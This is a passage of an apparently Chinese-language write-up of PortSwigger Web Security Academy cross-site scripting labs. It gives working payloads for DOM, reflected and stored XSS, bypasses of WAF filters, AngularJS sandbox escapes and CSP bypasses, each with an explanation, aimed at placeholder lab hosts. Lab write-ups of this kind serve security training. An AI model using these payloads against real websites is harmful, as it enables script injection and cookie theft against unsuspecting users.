language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span></code></pre></li></ol><h5id="lab-dom-xss-in-jquery-anchor-href-attribute-sink-using-location.search-source">Lab:DOM XSS in jQuery anchor href attribute sink using location.searchsource</h5><ol type="1"><li><p>submit feedback页面，修改url参数<imgsrc="https://s2.loli.net/2023/07/21/LyKbumPV3FDMReW.png"alt="image-20230721154220785" /></p><ol type="1"><li>F12<img src="https://s2.loli.net/2023/07/21/OILkWrbstv8ufxM.png"alt="image-20230721154239493" /></li></ol></li><li><p>url参数：payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">javascript</span><span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></code></pre><p>图<img src="https://s2.loli.net/2023/07/21/GTmzhXMtx48aQru.png"alt="image-20230721154343943" /></p></li><li><p>Hit enter and click "back".</p></li></ol><h5id="lab-dom-xss-in-jquery-selector-sink-using-a-hashchange-event">Lab:DOM XSS in jQuery selector sink using a hashchange event</h5><ol type="1"><li><p>Js<img src="https://s2.loli.net/2023/07/21/GXcYbEStTgIdK2Q.png"alt="image-20230721163305412" /></p><p>漏洞利用原理如下：</p><ol type="1"><li>利用过程解释：<ol type="a"><li><p>将恶意iframe插入实验室网站首页的哈希部分，当访问实验室首页时，将会触发hashchange事件。</p></li><li><p>hashchange事件处理函数首先尝试根据哈希部分匹配相应的博客文章标题，但由于哈希部分包含了恶意的<code>&lt;img src=x onerror=print()&gt;</code>代码，导致该代码被注入到jQuery的选择器<code>$()</code>中作为输入。</p></li><li><p>jQuery的选择器接受字符串作为输入，若以<code>#</code>字符开头，则会被认为是选择器，而非HTML代码。但在该漏洞中，jQuery没有对输入进行防护，因此可以成功注入HTML代码。</p></li><li><p>当<code>$()</code>选择器执行时，恶意代码<code>&lt;img src=x onerror=print()&gt;</code>被认为是选择器的一部分，而非HTML代码，导致执行<code>this.src+='&lt;img src=x onerror=print()&gt;'</code>这段JavaScript代码。</p></li><li><p>由于iframe的src属性在加载时会被赋值为<code>https://YOUR-LAB-ID.web-security-academy.net/#&lt;img src=x onerror=print()&gt;</code>，在实验室首页加载iframe时，会触发其中的<code>onload</code>事件。</p></li><li><p>在<code>onload</code>事件中，恶意代码<code>&lt;img src=x onerror=print()&gt;</code>被执行，导致调用<code>print()</code>函数，实现XSS漏洞利用。</p></li></ol></li></ol></li><li><p>payload</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://YOUR-LAB-ID.web-security-academy.net/#<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span>src<span class="token operator">+=</span><span class="token string">'&lt;img src=x onerror=print()>'</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span></code></pre></li></ol><ul><li>为了利用DOM-basedXSS漏洞，我们需要将这个Payload注入到目标网页的DOM中。由于目标网页的域名并非攻击者所控制，直接在目标网页上插入这个Payload是不可能的。因此，我们需要通过一个服务器来构造包含Payload的恶意iframe，并将这个iframe作为一个URL提供给受害者。当受害者打开带有恶意iframe的URL时，JavaScript会加载该iframe并执行其中的代码，从而利用DOM-basedXSS漏洞并执行<code>print()</code>函数。</li></ul><h5id="lab-dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded">Lab:DOM XSS in AngularJS expression with angle brackets and double quotesHTML-encoded</h5><ol type="1"><li><p>ng-app<imgsrc="https://s2.loli.net/2023/07/21/RsVZwumrfcdGztH.png"alt="image-20230721202456671" /></p></li><li><p>payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token class-name">$on</span><span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">'alert(1)'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>解析</strong>：</p><p>在AngularJS中，双花括号<code>&#123;&#123;&#125;&#125;</code>用于进行数据绑定，将JavaScript表达式的结果插入到HTML中。在给定的表达式中，<code>$on</code>是一个AngularJS内部的事件处理器对象，而<code>constructor</code>是JavaScript中的构造函数。</p><p>通过这个表达式<code>&#123;&#123;$on.constructor('alert(1)')()&#125;&#125;</code>，AngularJS将尝试执行<code>$on.constructor('alert(1)')</code>，这会创建一个新的函数，并将JavaScript代码<code>alert(1)</code>作为字符串传递给构造函数。然后通过<code>()</code>调用这个新创建的函数，最终导致<code>alert(1)</code>被执行。</p><p>这个漏洞是由于在AngularJS中使用<code>&#123;&#123;$on.constructor&#125;&#125;</code>可以访问构造函数并执行任意代码。这种情况下的DOMXSS漏洞可利用恶意代码注入并在页面上执行任意JavaScript代码，包括弹出警示框等操作。</p></li></ol><h5 id="lab-reflected-dom-xss">Lab: Reflected DOM XSS</h5><ol type="1"><li><p>响应<img src="https://s2.loli.net/2023/07/21/tVdiQBTHX8wfUbe.png"alt="image-20230721210024120" /></p></li><li><p>payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">\"<span class="token operator">-</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">//</span></code></pre></li></ol><h5 id="lab-stored-dom-xss">Lab: Stored DOM XSS</h5><ul><li>replace()函数只替换第一次出现的匹配项，利用了额外的角括号绕过了过滤器</li></ul><ol type="1"><li><p>Payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span></code></pre></li></ol><h4 id="which-sinks-can-lead-to-dom-xss-vulnerabilities">Which sinks canlead to DOM-XSS vulnerabilities?</h4><p>The following are some of the main sinks that can lead to DOM-XSSvulnerabilities:</p><pre class="language-none"><code class="language-none">document.write() document.writeln()document.domain element.innerHTML element.outerHTML element.insertAdjacentHTMLelement.onevent</code></pre><p>The following jQuery functions are also sinks that can lead toDOM-XSS vulnerabilities:</p><pre class="language-none"><code class="language-none">add() after() append() animate() insertAfter() insertBefore() before() html() prepend() replaceAll() replaceWith() wrap() wrapInner() wrapAll() has() constructor() init() index() jQuery.parseHTML() $.parseHTML()</code></pre><h4 id="cross-site-scripting-contexts">Cross-site scriptingcontexts</h4><h5id="lab-reflected-xss-into-html-context-with-most-tags-and-attributes-blocked">Lab:Reflected XSS into HTML context with most tags and attributesblocked</h5><ol type="1"><li><p>存在WAF</p></li><li><p>爆破tag<imgsrc="https://s2.loli.net/2023/07/21/uikB6bqYcaVEM7s.png"alt="image-20230721233217143" /></p></li><li><p>爆破事件<imgsrc="https://s2.loli.net/2023/07/21/dVKn5Qh7LHepDJk.png"alt="image-20230721233238229" /></p></li><li><p>最终payload</p><pre class="language-markup" data-language="markup"><code class="language-markup">&lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'></code></pre><p><strong>解析：</strong></p><p>当实验目标网站接收到这个payload，并将其存储在服务器端，然后在后续的响应中将它呈现出来时，浏览器会执行其中的JavaScript代码：<code>&lt;body onresize=print()&gt;</code>。这个代码片段定义了一个onresize事件处理程序，当浏览器窗口大小发生改变时，就会触发该事件处理程序，并调用<code>print()</code>函数输出一段文本或执行任意其他JavaScript代码。</p></li></ol><h5id="lab-reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones">Lab:Reflected XSS into HTML context with all tags blocked except customones</h5><ol type="1"><li><p>payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>location <span class="token operator">=</span> <span class="token string">'https://YOUR-LAB-ID.web-security-academy.net/?search=&lt;xss id=x onfocus=alert(document.cookie) tabindex=1>#x'</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p><strong>解析：</strong></p><p><code>&lt;xss id=x onfocus=alert(document.cookie) tabindex=1&gt;</code></p><ul><li><p><code>&lt;xss id=x</code>:这是一个自定义标签，名称为"xss"，并且使用<code>id</code>属性为它赋予一个标识符"x"。通常情况下，浏览器不会对自定义标签做特殊处理，所以这个标签不会引起注意。</p></li><li><p><code>onfocus=alert(document.cookie)</code>:这是<code>onfocus</code>事件处理程序，当元素获得焦点时触发。在这里，我们将其设置为弹出一个包含用户cookie的警示框(alert)。</p></li><li><p><code>tabindex=1</code>:这是<code>tabindex</code>属性，它指定元素在Tab键遍历页面时的顺序。通过将其设置为1，我们可以确保这个元素可以通过键盘Tab键聚焦，从而触发<code>onfocus</code>事件。</p></li></ul><p>这样的payload在DOM-basedXSS漏洞中特别有用，因为它不依赖于特定的HTML元素或事件，而是直接利用了浏览器的特性，即当一个元素获得焦点时，相关的onfocus事件处理程序会被执行。如果该payload被插入到页面中的一个DOM元素内，并且该元素被设置为自动获得焦点，那么当页面加载时，onfocus事件将立即触发，并导致XSS漏洞的利用，弹出包含用户cookie的警示框。</p></li></ol><h5id="lab-reflected-xss-with-event-handlers-and-href-attributes-blocked">Lab:Reflected XSS with event handlers and href attributes blocked</h5><ol type="1"><li><p>Payload</p><pre class="language-markup" data-language="markup"><code class="language-markup">https://YOUR-LAB-ID.web-security-academy.net/?search=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>animate</span> <span class="token attr-name">attributeName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>href</span> <span class="token attr-name">values</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>javascript:alert(1)</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span> <span class="token attr-name">x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>20</span> <span class="token attr-name">y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>20</span><span class="token punctuation">></span></span>Click me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p>分析：</p><p>这个URL包含一个SVG图像，其中包含一个<code>&lt;a&gt;</code>标签和一个<code>&lt;animate&gt;</code>标签。<code>&lt;a&gt;</code>标签用于创建超链接，而<code>&lt;animate&gt;</code>标签用于在动画中更改属性的值。</p><p>分析如下：</p><ol type="1"><li><code>search=&lt;svg&gt;&lt;a&gt;&lt;animate attributeName=href values=javascript:alert(1) /&gt;&lt;text x=20 y=20&gt;Click me&lt;/text&gt;&lt;/a&gt;</code>是一个GET请求，其中<code>search</code>参数被设置为一个SVG图像的代码。</li><li>在SVG代码中，<code>&lt;a&gt;</code>标签用于创建一个超链接，<code>&lt;animate&gt;</code>标签用于在动画中更改超链接的<code>href</code>属性的值。</li><li><code>attributeName=href</code>指定了要更改的属性是<code>href</code>属性，而<code>values=javascript:alert(1)</code>指定了动画的值，即在动画中更改<code>href</code>属性的值为<code>javascript:alert(1)</code>。</li><li>当页面加载时，动画开始执行，<code>href</code>属性的值被设置为<code>javascript:alert(1)</code>，导致浏览器执行其中的JavaScript代码，即弹出一个包含"1"的弹窗。</li></ol></li></ol><h5 id="lab-reflected-xss-with-some-svg-markup-allowed">Lab: ReflectedXSS with some SVG markup allowed</h5><ol type="1"><li><p>payload</p><pre class="language-markup" data-language="markup"><code class="language-markup">https://YOUR-LAB-ID.web-security-academy.net/?search="><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>animatetransform</span> <span class="token attr-name">onbegin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(1)</span><span class="token punctuation">></span></span></code></pre></li></ol><h5id="lab-reflected-xss-into-attribute-with-angle-brackets-html-encoded">Lab:Reflected XSS into attribute with angle brackets HTML-encoded</h5><ol type="1"><li><p>分析<img src="https://s2.loli.net/2023/07/22/N4sQ9T3igYIJ2Fn.png"alt="image-20230722011511012" /></p></li><li><p>paylaod</p><pre class="language-markup" data-language="markup"><code class="language-markup">"onmouseover="alert(1)</code></pre></li></ol><h5id="lab-stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded">Lab:Stored XSS into anchor href attribute with double quotesHTML-encoded</h5><ul><li>javascript 伪协议</li></ul><ol type="1"><li><p>website输入框输入"abcde"<imgsrc="https://s2.loli.net/2023/07/23/7TYp35nAHr2fMZj.png"alt="image-20230723131730123" /></p></li><li><p>payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">javascript</span><span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre></li></ol><h5 id="lab-reflected-xss-in-canonical-link-tag">Lab: Reflected XSS incanonical link tag</h5><ol type="1"><li><p>payload</p><pre class="language-markup" data-language="markup"><code class="language-markup">https://YOUR-LAB-ID.web-security-academy.net/?'accesskey='x'onclick='alert(1)</code></pre><p>分析：</p><ol type="1"><li>To trigger the exploit on yourself, press one of the following keycombinations:<ul><li>On Windows: <code>ALT+SHIFT+X</code></li><li>On MacOS: <code>CTRL+ALT+X</code></li><li>On Linux: <code>Alt+X</code></li></ul></li></ol></li></ol><h5id="lab-reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped">Lab:Reflected XSS into a JavaScript string with single quote and backslashescaped</h5><ol type="1"><li><p>分析<img src="https://s2.loli.net/2023/07/23/kmY54NOJLWhaXA1.png"alt="image-20230723133454092" /></p></li><li><p>payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li></ol><h5id="lab-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded">Lab:Reflected XSS into a JavaScript string with angle brackets HTMLencoded</h5><ol type="1"><li><p>payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'-alert(1)-'</span></code></pre></li></ol><h6id="lab-reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-escaped">Lab:Reflected XSS into a JavaScript string with angle brackets and doublequotes HTML-encoded and single quotes escaped</h6><ol type="1"><li><p>payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">\'<span class="token operator">-</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span></code></pre></li></ol><h5id="lab-reflected-xss-in-a-javascript-url-with-some-characters-blocked">Lab:Reflected XSS in a JavaScript URL with some characters blocked</h5><ol type="1"><li><p>payload</p><pre class="language-markup" data-language="markup"><code class="language-markup">https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&amp;'&#125;,x=x=>&#123;throw/**/onerror=alert,1337&#125;,toString=x,window+'',&#123;x:'</code></pre><p><strong>解析：</strong></p><p>这个payload使用异常处理和箭头函数来执行代码。让我们逐步分析它：</p><ol type="1"><li><p><code>https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&amp;</code>：这是目标URL，其中<code>YOUR-LAB-ID</code>需要替换为实际的实验室ID。</p></li><li><p><code>'&#125;,x=x=&gt;&#123;throw/**/onerror=alert,1337&#125;,toString=x,window+'',&#123;x:'</code>：这部分是payload，它的作用是在页面中触发alert弹窗。</p><ul><li><code>'&#125;,x=x=&gt;&#123;...&#125;,</code>：在这里，我们定义了一个名为<code>x</code>的箭头函数。</li><li><code>throw/**/onerror=alert,1337</code>：这是一个throw语句，它将onerror事件处理程序设置为alert函数并传递参数1337。由于throw语句不能作为表达式直接执行，我们使用箭头函数来包装它。</li><li><code>toString=x,window+'',&#123;x:''</code>：这部分代码将箭头函数<code>x</code>赋值给<code>toString</code>属性，并通过强制将window对象转换为字符串来触发执行。最后的空对象<code>&#123;x: ''&#125;</code>是为了让代码合法。</li></ul></li></ol><p>总的来说，这个payload的效果是，当访问目标URL时，它会在页面加载时通过异常处理调用alert函数，并弹出一个带有参数1337的弹窗。请注意，为了使这个payload生效，实验室的ID应该被正确替换到URL中。</p></li></ol><h5id="lab-stored-xss-into-onclick-event-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-and-backslash-escaped">Lab:Stored XSS into onclick event with angle brackets and double quotesHTML-encoded and single quotes and backslash escaped</h5><ol type="1"><li><p>分析<img src="https://s2.loli.net/2023/07/23/I3JbW6TSxNCVt5h.png"alt="image-20230723141703048" /></p></li><li><p>website输入框payload</p><pre class="language-markup" data-language="markup"><code class="language-markup">http://foo?<span class="token entity named-entity" title="&apos;">&amp;apos;</span>-alert(1)-<span class="token entity named-entity" title="&apos;">&amp;apos;</span></code></pre></li></ol><h5id="lab-reflected-xss-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-unicode-escaped">Lab:Reflected XSS into a template literal with angle brackets, single,double quotes, backslash and backticks Unicode-escaped</h5><ul><li><p>Javascript 模板 <code>$&#123;...&#125;</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Welcome, </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>user<span class="token punctuation">.</span>displayName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></code></pre></li></ul><ol type="1"><li><p>分析<img src="https://s2.loli.net/2023/07/23/xXeortwNTcWYaG7.png"alt="image-20230723142314448" /></p></li><li><p>payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">$<span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h4 id="client-side-template-injection">Client-side templateinjection</h4><ol type="1"><li><p>The AngularJS sandbox is a mechanism that prevents access topotentially dangerous objects, such as <code>window</code> or<code>document</code>, in AngularJS template expressions. It alsoprevents access to potentially dangerous properties, such as<code>__proto__</code>.</p></li><li><p><strong>AngularJS沙箱</strong>的工作原理如下：</p><ol type="1"><li>表达式解析：AngularJS首先对表达式进行解析，识别其中的JavaScript代码片段。</li><li>重写JavaScript：接下来，AngularJS会对解析后的JavaScript代码进行<strong>重写</strong>。这个过程包括对代码进行变换和添加一些限制，以确保其中不包含危险的操作。</li><li>安全性检测：经过重写后的代码将会被传递给一系列函数进行安全性检测。这些函数会检查代码中是否包含任何危险的对象或属性。<ol type="1"><li><code>ensureSafeObject()</code>:检查给定的对象是否引用了自身，例如用于检测window对象。<br /></li><li><code>ensureSafeMemberName()</code>:检查对象的每个属性访问，如果包含危险的属性如<code>__proto__</code>或<code>__lookupGetter__</code>，则将被阻止访问。<br /></li><li><code>ensureSafeFunction()</code>:阻止对<code>call()</code>、<code>apply()</code>、<code>bind()</code>或<code>constructor()</code>等函数的调用。通过这些安全性检测，</li></ol></li></ol></li><li><p>当攻击者成功地全局修改了<code>charAt()</code>函数，并将其覆盖为<code>[].join</code>方法时，<code>charAt()</code>函数的行为发生了改变，会将所有字符连接成一个字符串。这个修改后的<code>charAt()</code>函数可以在AngularJS表达式中利用，导致了沙箱逃逸漏洞。</p><p>假设在AngularJS的应用程序中，有一个表达式需要处理用户输入的数据，并根据用户提供的输入执行某些操作，例如：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> userInput <span class="token operator">=</span> <span class="token string">'Hello'</span><span class="token punctuation">;</span><span class="token keyword">var</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">var</span> character <span class="token operator">=</span> userInput<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>正常情况下，上述代码会获取字符串<code>userInput</code>中索引为<code>index</code>的字符，并将其存储在变量<code>character</code>中。在这个例子中，<code>character</code>应该存储字符串<code>'H'</code>，因为索引0处的字符是<code>'H'</code>。</p><p>然而，攻击者进行了如下全局修改：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'a'</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>charAt <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">;</span></code></pre><p>现在，当表达式被执行时，<code>charAt()</code>函数实际上执行的是<code>[].join</code>方法，将字符串<code>userInput</code>中的所有字符连接成一个字符串。因此，即使<code>index</code>被设置为0，<code>character</code>中存储的值不再是<code>'H'</code>，而是整个<code>userInput</code>字符串，即<code>'Hello'</code>。</p><p>这就产生了漏洞：攻击者可以通过输入特定的表达式来触发被修改后的<code>charAt()</code>函数，并利用AngularJS提供的<code>$eval()</code>函数来执行恶意代码。例如，攻击者可以输入以下内容：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> userInput <span class="token operator">=</span> <span class="token string">'$eval("alert(\'Malicious Code Executed!\')")'</span><span class="token punctuation">;</span><span class="token keyword">var</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">var</span> character <span class="token operator">=</span> userInput<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>当表达式被执行时，<code>charAt()</code>函数实际上执行的是<code>[].join</code>方法，将整个<code>userInput</code>字符串连接起来，即：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$eval</span><span class="token punctuation">(</span><span class="token string">"alert('Malicious Code Executed!')"</span><span class="token punctuation">)</span></code></pre></li><li><p>在这篇文章中，介绍了一种构建高级 AngularJS 沙箱逃逸（sandboxescape）的方法。沙箱逃逸是指欺骗沙箱，让它认为恶意表达式是无害的，从而绕过安全限制。文章提供了一个情境，即某些网站可能限制您使用双引号或单引号等字符。在这种情况下，您需要使用诸如<code>String.fromCharCode()</code> 等函数来生成字符。虽然 AngularJS在表达式中阻止访问 <code>String</code>构造函数，但可以通过使用字符串的构造函数属性来绕过这一限制。但是这显然需要一个字符串，因此要构造这样的攻击，您需要找到一种在不使用单引号或双引号的情况下创建字符串的方法。</p><p>通常的沙箱逃逸中，会使用 <code>$eval()</code> 函数来执行 JavaScript负载（payload），但在这里提供的实验中，<code>$eval()</code>函数是未定义的。幸运的是，可以使用 <code>orderBy</code>过滤器来代替。<code>orderBy</code>过滤器通常用于对对象进行排序，但它也接受一个表达式作为参数，这意味着我们可以使用它来传递负载。</p><p>具体而言，<code>orderBy</code> 过滤器的典型语法如下：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">]</span> <span class="token operator">|</span> orderBy<span class="token operator">:</span> <span class="token string">'Some string'</span></code></pre><p>在上面的代码中，我们将左侧的数组 <code>[123]</code> 传递给右侧的<code>orderBy</code>过滤器。冒号表示要传递给过滤器的参数，这里是一个字符串。<code>orderBy</code>过滤器通常用于对对象进行排序，但在这里我们将其用于传递负载。</p><p>这篇文章旨在向读者展示如何构造一个更复杂的 AngularJS沙箱逃逸，以绕过网站中对字符使用的限制。文章最后提到你已经拥有了解决下一个实验的所有工具。因此，如果您是网络安全研究人员，并且对沙箱逃逸和AngularJS安全有兴趣，这篇文章可能对您有所帮助。请记得在进行任何安全研究和测试时，遵循道德准则和法律法规，并仅在授权的范围内进行测试。</p></li></ol><h5id="lab-reflected-xss-with-angularjs-sandbox-escape-without-strings">Lab:Reflected XSS with AngularJS sandbox escape without strings</h5><ol type="1"><li><p>payload</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">https</span><span class="token punctuation">:</span><span class="token header-value">//YOUR-LAB-ID.web-security-academy.net/?search=1&amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1</span></span></code></pre><ol type="1"><li><code>search=1</code>：这是一个正常的查询参数，其值为1。</li><li><code>toString().constructor.prototype.charAt%3d[].join</code>：这是整个Payload的第一部分，它的目的是修改<code>charAt()</code>函数，以使其行为变为将所有字符连接成一个字符串。<code>%3d</code>是 URL编码的等号（=），所以这里实际上是将<code>charAt()</code>函数覆盖为<code>[].join</code>。接下来，我们来看整个Payload的第二部分：<code>[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1</code>1.<code>[1]</code>：这是一个数组，数组中包含元素1。<code>|orderBy:</code>：这是AngularJS中的<code>orderBy</code>过滤器，它会对数组进行排序，但在这个Payload中并不关心排序，仅用于执行后面的表达式</li><li><code>toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1</code>：这是整个Payload的第二部分，它的目的是构造一个字符串来执行恶意代码。<code>toString()</code>用于将数字1转换为字符串，并接着使用<code>constructor</code>来访问String构造函数，然后使用<code>fromCharCode()</code>来将ASCII码转换为字符。在这里，ASCII码为<code>120,61,97,108,101,114,116,40,49,41</code>，它对应的字符是<code>x=alert(1)</code>。</li></ol></li></ol><hr /><ol type="1"><li><p>CSP（内容安全策略）绕过涉及HTML注入和使用特殊的AngularJS事件来执行沙箱逃逸。当AngularJS处于CSP模式下时，它改变了模板表达式的解析方式，并避免使用Function构造函数，使得标准的沙箱逃逸方法无效。</p><ol type="1"><li><p>为了绕过CSP，AngularJS定义了自己的事件来代替被阻止的JavaScript事件。在事件中，AngularJS提供了一个特殊的<code>$event</code>对象，该对象是对浏览器事件对象的引用。通过使用这个对象，可以实现CSP绕过。</p></li><li><p>在Chrome浏览器中，<code>$event</code>对象有一个名为<code>path</code>的特殊属性，它包含导致事件执行的对象数组。在数组的最后，永远是<code>window</code>对象。通过将这个数组传递给<code>orderBy</code>过滤器，可以枚举数组并使用最后一个元素（<code>window</code>对象）来执行全局函数，例如<code>alert()</code>。</p></li><li><p>以下是一个示例，演示了如何进行CSP绕过：</p><p><code>html &lt;input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'"&gt;</code></p><p>在这个示例中，<code>ng-focus</code>属性设置为一个表达式，该表达式使用<code>$event.path</code>和<code>orderBy</code>过滤器。<code>orderBy</code>过滤器枚举从<code>$event.path</code>获取的数组，并在<code>window</code>对象上调用<code>alert()</code>函数。</p></li></ol><p>4.需要注意的是，直接调用<code>alert()</code>函数会被AngularJS沙箱检测并阻止。但是，通过结合<code>from()</code>函数和<code>orderBy</code>，它可以有效地隐藏<code>window</code>对象，从而允许注入恶意代码。</p></li><li><p>在"CSP与AngularJS沙箱逃逸"实验中，由于存在长度限制，之前提到的方法将不起作用。为了成功利用这个实验，需要想出各种方法来隐藏<code>window</code>对象，从而避免被AngularJS沙箱检测。其中一种可行的方法是使用<code>array.map()</code>函数。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>alert<span class="token punctuation">)</span></code></pre><ol type="1"><li>CSP和AngularJS沙箱：CSP是一种浏览器安全功能，限制执行的内容以保护网站免受跨站脚本攻击（XSS）等。AngularJS沙箱是一种保护机制，限制解析和执行表达式时对全局对象和某些危险函数的访问，从而防止恶意代码的执行。</li><li>实验目标和长度限制：该实验设有长度限制，导致前面提到的方法无法生效。实验的目标是绕过CSP和AngularJS沙箱，执行恶意代码。</li><li>使用<code>array.map()</code>函数：为了绕过CSP和AngularJS沙箱，攻击者使用了<code>array.map()</code>函数。<code>array.map()</code>函数对数组中的每个元素应用一个函数，并返回结果构成的新数组。在这里，攻击者将<code>alert</code>函数作为参数传递给<code>[1].map()</code>，从而执行<code>alert()</code>函数。</li><li>绕过AngularJS沙箱：关键在于攻击者在调用<code>alert()</code>函数时，并没有显式引用<code>window</code>对象，而是直接使用<code>alert()</code>函数的引用。这样绕过了AngularJS对<code>window</code>对象的检测。</li><li>解决实验：为了解决该实验，攻击者需要尝试各种方法来执行<code>alert()</code>函数，而不触发AngularJS的<code>window</code>检测。在CSP环境下，某些函数调用和全局对象访问受到限制，攻击者需要找到适合的方法来绕过这些限制，并成功执行恶意代码。</li></ol></li></ol><h5 id="lab-reflected-xss-with-angularjs-sandbox-escape-and-csp">Lab:Reflected XSS with AngularJS sandbox escape and CSP</h5><ol 